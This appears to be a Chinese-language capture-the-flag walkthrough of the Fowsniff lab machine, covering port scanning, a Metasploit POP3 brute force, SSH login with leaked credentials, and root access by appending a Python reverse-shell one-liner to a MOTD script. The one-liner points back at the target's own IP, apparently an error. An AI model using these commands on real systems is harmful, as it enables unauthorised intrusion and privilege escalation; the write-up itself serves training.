![](../Images/15b455afcee67493c4af27eb6c7b05b3.png)实战过程

我们先开始进行端口扫描，使用netdiscover命令：  

 netdiscover

![](../Images/190797e2c616e01698fb26f27b9dc247.png)

发现目标IP地址是192.168.1.29

接下来用nmap神器来扫描目标IP地址，命令如下：

 nmap -A -p -T4 192.168.1.29

![](../Images/a639469870ef74f159dc7456435dcf4b.png)

扫描结果显示有4个端口开放，22(ssh),80(http)，110(pop3),143(imap)。

先看看80端口会不会有收获，打开浏览器访问：

![](../Images/c461b8d6a27f9268c7f39c6bc8887cfa.png)

页面上没有发现什么，继续使用dirb和nikto进行扫描也没有什么收获，于是我Google了一番页面上显示的这个fowsniff corp，发现了一个包含用户名和密码的pastebin链接。（链接在此）。

![](../Images/fc5ac051c8617452fb9357e0dfd873ad.png)

我们找到了一些哈希值并进行在线破解，找到了一些电子邮件对应的密码，不过有9个用户名，却只破解了8个哈希，如图：

![](../Images/6d4f57950a28fa7d83e749ee44fd2681.png)

所以我创建了两个字典，一个是用户名字典，一个是密码字典。我们将使用这两个字典来爆破pop3登录。

![](../Images/0a4ff7634fa990df3425b3be63b1fd42.png)

我们使用msf来爆破pop3登录，命令和配置如下：

 msf > use auxiliary/scanner/pop3/pop3\_login

msf auxiliary(scanner/pop3/pop3\_login) > set rhosts 192.168.1.29

msf auxiliary(scanner/pop3/pop3\_login) > set user\_file user.txt

msf auxiliary(scanner/pop3/pop3\_login) > set pass\_file pass.txt

msf auxiliary(scanner/pop3/pop3\_login) > set verbose false

msf auxiliary(scanner/pop3/pop3\_login) > run

运行之后我们找到了正确的凭证，“seina:scoobydoo2”，如图：

![](../Images/fe286596270ee4c5f3b15a0ada6278b9.png)

接着我们连接到靶机的pop3服务上，使用刚才获取的凭证进行登录。登录上之后，我们查看下信息，发现有两条信息，命令如下：

 nc 192.168.1.29 110

user seina

pass scoobydoo2

list

![](../Images/ba57784c31fc64965abf486b53f2194b.png)

我们查看第一条信息的内容，发现它包含ssh的密码

 retr 1

![](../Images/6335f786df8a8935035becd16d1c2c1a.png)

接着查看第二条信息，信息中可以看到发件人是baksteen@fowsniff，可以推断用户名是baksteen：

 retr 2

![](../Images/c5eb1005a0c8da2d17bf10acc0e09823.png)

接着我们使用刚才获得的凭证，也就是“baksteen:S1ck3nBluff+secureshell”来登录ssh：

 ssh baksteen@192.168.1.29

![](../Images/e987836399fd9be8e0c989edf3ed4c67.png)

登录成功。

对系统进行一下枚举，发现用户baksteen属于两个不同的组。我们尝试找到属于users组的文件，发现了一个脚本“cube.sh”，查找命令如下：

 find / -group users -type f 2>/dev/null

![](../Images/8b263567f5b2230c625b77760bb1dba1.png)

我们查看一下这个脚本文件的内容，发现它包含我们ssh登陆后出现的界面信息，对照上图ssh登录成功后的截图便知。

 cd /opt/cube

cat cube.sh

![](../Images/0aa214d9361a01d85fda2fe670bf7d41.png)

我们使用vim打开该文件，并在文件结尾添加一行Python反弹shell的命令：

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'

如图：  

![](../Images/04c649482fa75035deb63785806726e8.png)

保存后，我们尝试执行该脚本，报错，错误信息是“Python command is not found”。于是我们在系统中查找Python，发现安装的是Python3，如图：

![](../Images/170d61af5aca949bc12f5765fab49b2e.png)

所以我们修改反弹shell的命令为Python3，如下：

 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'

![](../Images/b4ab1d02c362823487f7816c4742f684.png)

由于我们登录到ssh时看到的banner跟cube.sh脚本包含的内容相似，所以我们来查看下“etc/update-motd.d”目录，查找运行改程序的可执行文件，发现了“00-header”这个文件运行这个shell脚本。

![](../Images/0c893bc537c2d65c26f2b19e191f3f10.png)

现在我们退出ssh，并且在本地使用netcat设置监听，然后我们重新连接ssh，这样的话，我们的反弹shell就成功执行了。

 ssh baksteen@192.168.1.29

![](../Images/b83100dd31cfa72d8efbe03e2e2ce2b6.png)

一旦成功登录，我们就获得了一个root用户的shell。我们切换到root目录，发现一个flag.txt的文件，查看文件便得到了我们的flag信息：

 nc -lvp 1234

id

cd /root

cat flag.txt
